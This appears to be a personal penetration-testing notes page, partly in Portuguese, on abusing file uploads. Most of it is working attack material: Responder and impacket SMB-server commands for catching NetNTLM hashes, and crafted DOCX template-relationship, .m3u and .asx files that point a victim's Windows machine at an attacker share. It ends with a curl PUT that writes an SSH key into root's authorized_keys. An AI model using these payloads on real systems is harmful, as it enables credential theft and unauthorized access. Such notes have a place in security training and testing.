File upload
========================

- [ ] [**Capturando hahses de senhas**](#capturando-hashes)

Aqui podemos considerar dois cenários diferentes, no caso pra Linux e pra Windows, dado que no caso do Windows podemos capturar os hashes de senha com algumas técnicas. Porém, para o contexto de file upload de alguma aplicação podemos levar em conta são os abaixo:


<details markdown="1"><summary markdown="1">
## Capturando hashes
</summary>

- [Fonte](https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes/#introduction)

Duas opções de captura que julgo interessantes:

Com impacket
```
    impacket-smbserver -smb2support smb .
```
Com responder

[Responder](https://github.com/lgandx/Responder).O responder detém a funcionalidade de SMB server, pelo qual receberemos os hashes obtidos por meio de alguma interação do usuário com algo que enviamos ao servidor (situação hipotética, mas válida):

```
git clone https://github.com/lgandx/Responder.git
cd Responder
sudo ./Responder.py -I <interface>
```

### Office

Another well-known attack is by abusing Office. Office documents can contain links to external content that when pointed to a network share can result in disclosing NetNTLM hashes. For example, a Word document can contain a link to a template file located on a share. The template file can be set via the word\_rels\settings.xml.rels file located in the DOCX file.

***[word_rels\settings.xml.rels](https://www.datocms-assets.com/21957/1592981117-leak.docx):***

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file://<responder ip>/leak/Template.dotx" TargetMode="External"/>
</Relationships>
```

![media-OUPUri](../../../media/media-OUPUri.png)  
*Figure 2: leak NetNTLM hashes using Word*

Não funciona caso o documento seja aberto em modo "protected". Normalmente esse comportamento ocorre quando é um documento vindo de um website ou email.

Podemos utilizar uma técnica de upload de arquivo malicioso também por meio [dessa referência](../..//Malware/OfficeDocs.md)

### Windows Media Player

Os reprodutores de mídia tendem a suportar muitos formatos de arquivos de áudio e vídeo e listas de reprodução. As listas de reprodução podem ser vistas como uma coleção de links para arquivos externos, incluindo arquivos localizados em compartilhamentos de rede. Naturalmente, isso pode ser abusado para roubar hashes NetNTLM. O Windows Media Player não é exceção: abrir uma lista de reprodução especialmente criada no Windows Media Player pode revelar hashes a um invasor.

salvar como leak.m3u, por exemplo:

```
#EXTM3U
#EXTINF:1337, Leak
\\<responder ip>\leak.mp3
```

Outro exemplo seria com asx:

salvar como leak.asx, por exemplo:

```
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://<responder ip>/leak/leak.wma"/>
</entry>
</asx>
```
</details>

<details markdown="1"><summary markdown="1">
## Webshells
</summary>

</details>

First, we can make burp suite verify which file types the aplication handles. Get the file upload request and send to intruder:

![qownnotes-media-ZLiKHw](../../../media/1703.png)

Set the payload for the file extension:
![qownnotes-media-DujTfX](../../../media/4286.png)


![qownnotes-media-QSjTAJ](../../../media/32681.png)


php shell

```
curl http://10.10.10.15 --upload-file test.txt -v
```
    
```
curl -X POST http://10.10.10.198:8080/up.php --upload-file test.txt -v
```
    
 
```
curl -X PUT http://127.0.0.1:9001/root/.ssh/authorized_keys -d "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCauEbpsah1HJTzPR8GXSyqFYULaqSOM6fBjYRp1qM70GIPTGSin25qS76uzC/vHJi48JdvIipLIYcHOFbkFzL8B44Pcdrrb8SKz6CNoLA4wzArcMRlFR4PwPnPBnFuele0wg3NEgps/JsCGLGTJkymcUdml/AIAcNtFA27ThmuoNp1VMrBMW7gKxYXmHV9Umsd+XVMZXlkasprDdQWjUMkWjdno28jv8fltBxTywvDff1Y0N2dhqtPzuv7NHzgXiwCSASG7VlISdMl8gZ8r1qwF7ufgDivWhUX9HcLTv0EbCpfiyhg20ycOI0tcPbH3p5Qsn9r9IqEkvVXuVIHu5CZO3r7Yc382UQbYgRBp0yoZpeGX7V9tsyGm2JKusxGfyyALUuG2OFioOkgwaz1jR9Yh73fAuvhf3PXi63i1YMMui+M3132YcxwKPnDe74qeAiJ4/2j8tIyXCr9T4Oca/AL+rkkYiToDYeY4lRN9Ai01lbi1ujzuy2QyRktmOR7Xfb3iEKL53QdW9NK3LUllCHNC89oMpk90oyFDUuVSZBlJ+xHHir2avNzzGmaMKUP00a0Kx7f+vsg4fxb1tPjYayiJuedDGqys4R3oH6kdGjPCz6jlbhYz2CStxDb8GhAvqzN0D48qB/7/b0JTsNoj/zSBNdPf0rN00jKUD9/kXXsQw== test@test.com"
```